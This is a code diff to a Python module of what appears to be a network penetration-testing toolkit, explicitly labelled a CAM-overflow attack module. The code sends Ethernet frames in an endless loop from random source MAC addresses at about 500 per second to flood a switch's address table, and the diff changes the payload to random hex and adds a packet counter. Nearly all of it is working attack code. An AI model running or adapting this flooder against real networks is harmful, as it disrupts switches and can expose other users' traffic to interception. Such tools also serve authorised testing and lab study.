@@ -5,6 +5,7 @@ from random import uniform
 from src.envena.base.arguments import Arguments
 from src.envena.base.tool import Tool
 from src.modules.ethernet.ether import EtherPacket, EtherPacketType
+from secrets import token_hex
 
 
 def cam_overflow(param, logger)->None:
@@ -15,15 +16,20 @@ def cam_overflow(param, logger)->None:
     
     try:
         eth_src=rand_eth()
-        hexdump(Ether(src=rand_eth(), dst=str(param.eth_dst).replace('-',':') if param.eth_dst else rand_eth()) / (param.input))
+        hexdump(Ether(src=rand_eth(), dst=str(param.eth_dst).replace('-',':') if param.eth_dst else rand_eth()) / (token_hex(32)))
+        sent_packets = 0
         while True:
             try:
                 # eth_src=rand_eth()
                 # sendp(Ether(src=eth_src, dst=param.eth_dst if param.eth_dst else rand_eth()) / (param.input), verbose=False, iface=param.iface)
                 eth_src = rand_eth()
-                EtherPacket(iface=param.iface, count=1, timeout=0, eth_src=eth_src, eth_dst=\
-                param.eth_dst if param.eth_dst else rand_eth(), packet_type=EtherPacketType.Ether, payload=\
-                param.input if param.input else 'X'*64).send_packet(printed=False)
+                
+                EtherPacket(
+                    iface=param.iface, count=1, timeout=0, eth_src=eth_src, 
+                    eth_dst=param.eth_dst if param.eth_dst else rand_eth(), 
+                    packet_type=EtherPacketType.Ether, 
+                    payload=token_hex(32)).send_packet(printed=False)
+                
                 logger.info(f"{sent_packets}... Sent ethernet frame from MAC: {eth_src}")
                 sent_packets += 1
             except Exception as e:
@@ -37,8 +43,8 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(description=f"CAM-overflow attack module")
     parser.add_argument("-i", "--iface", help="network iface send from", required=False, default=str(conf.iface))
     parser.add_argument("-ed", "--eth_dst", help="destination MAC-address", required=False, default=rand_eth())
-    parser.add_argument("-in", "--input", help="payload content. The default is 'X' in 64 times", required=False, default='X'*64)
-    parser.add_argument("-t", "--timeout", help="timeout between of sending packets. The default is 500 MAC/sec", required=False, type=float, 
+    # parser.add_argument("-p", "--payload", help="payload content. The default is 'X' in 64 times", required=False, default='X'*64)
+    parser.add_argument("-t", "--timeout", help="timeout between of sending packets. The default is 0.002 (~500 packets/sec)", required=False, type=float, 
                         default=0.002)
 
     cli_args = parser.parse_args()
@@ -48,6 +54,7 @@ if __name__ == '__main__':
     args.timeout = cli_args.timeout
     args.eth_dst = cli_args.eth_dst
     args.iface = cli_args.iface
+    # args.input = cli_args.payload
     
     t_cam_overflow = Tool(tool_func=cam_overflow, VERSION=1.1, args=args)
     
